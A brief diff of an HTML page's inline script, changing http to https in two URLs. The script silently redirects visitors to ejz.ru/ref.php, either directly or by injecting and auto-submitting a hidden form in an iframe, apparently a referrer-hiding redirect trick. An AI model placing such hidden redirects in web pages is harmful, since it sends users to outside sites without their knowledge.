@@ -5,12 +5,12 @@
 <body>
 <script>
     var x = 0
-    function go2() { location.replace("http://ejz.ru/ref.php") }
+    function go2() { location.replace("https://ejz.ru/ref.php") }
     function go() {
         if(x) return
         x += 1
         try {
-            var html = '<form target="_parent" action="http://ejz.ru/ref.php">'
+            var html = '<form target="_parent" action="https://ejz.ru/ref.php">'
             html += '<input type="hidden" name="u" value="" /></form>'
             window.frames[0].document.body.innerHTML = html
             window.frames[0].document.forms[0].submit()
